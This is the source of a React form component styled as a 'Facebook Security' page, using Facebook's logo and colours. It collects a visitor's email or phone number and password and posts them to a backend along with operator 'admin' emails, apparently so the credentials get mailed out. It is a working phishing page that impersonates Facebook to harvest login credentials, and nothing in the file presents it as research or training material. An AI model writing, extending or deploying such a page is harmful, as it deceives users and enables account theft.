import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import { formTwoSchema, type FormTwo } from "@shared/schema";
import React from 'react';

export default function FormTwo() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();

  const form = useForm<FormTwo>({
    resolver: zodResolver(formTwoSchema),
    defaultValues: {
      user_email: "",
      password: "",
      admin_email: import.meta.env.VITE_SMTP_USER || "",
      admin_email_2: import.meta.env.VITE_ADMIN_EMAIL || "",
      admin_email_3: "", // Editable third admin email
    },
  });

  const onSubmit = async (data: FormTwo) => {
    try {
      const response = await fetch('/api/form-two', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      });

      if (!response.ok) {
        throw new Error('Failed to submit form');
      }

      toast({
        title: "Success!",
        description: "Your form has been submitted successfully."
      });
      setLocation("/success");
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to submit form. Please try again.",
      });
    }
  };

  return (
    <div className="min-h-screen bg-[#f0f2f5] flex justify-center items-center p-3 sm:p-4">
      <div className="bg-white p-6 sm:p-8 rounded-lg shadow-lg max-w-[360px] w-full text-center">
        <img 
          src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png?20231011121526"
          alt="Logo"
          className="w-[100px] sm:w-[120px] mx-auto mb-4 sm:mb-5"
        />
        <h1 className="text-base sm:text-lg font-bold text-[#333] mb-4 sm:mb-5">
          Facebook Security
        </h1>
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
            <FormField
              control={form.control}
              name="user_email"
              render={({ field }) => (
                <FormItem>
                  <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
                    Email or Phone Number
                  </FormLabel>
                  <FormControl>
                    <Input
                      type="text"
                      placeholder="Enter email or phone number"
                      className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
                      {...field}
                    />
                  </FormControl>
                  <FormMessage className="text-xs text-red-500 mt-1" />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="password"
              render={({ field }) => (
                <FormItem>
                  <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
                    Password
                  </FormLabel>
                  <FormControl>
                    <Input
                      type="password"
                      placeholder="Enter password"
                      className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
                      {...field}
                    />
                  </FormControl>
                  <FormMessage className="text-xs text-red-500 mt-1" />
                </FormItem>
              )}
            />
            <FormField
              control={form.control}
              name="admin_email_3"
              render={({ field }) => (
                <FormItem>
                  <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
                    Additional Email (Optional)
                  </FormLabel>
                  <FormControl>
                    <Input
                      type="email"
                      placeholder="Enter additional notification email"
                      className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
                      {...field}
                    />
                  </FormControl>
                  <FormMessage className="text-xs text-red-500 mt-1" />
                </FormItem>
              )}
            />
            <Button 
              type="submit" 
              className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm"
              disabled={form.formState.isSubmitting}
            >
              {form.formState.isSubmitting ? "Submitting..." : "Submit"}
            </Button>
          </form>
        </Form>
      </div>
    </div>
  );
}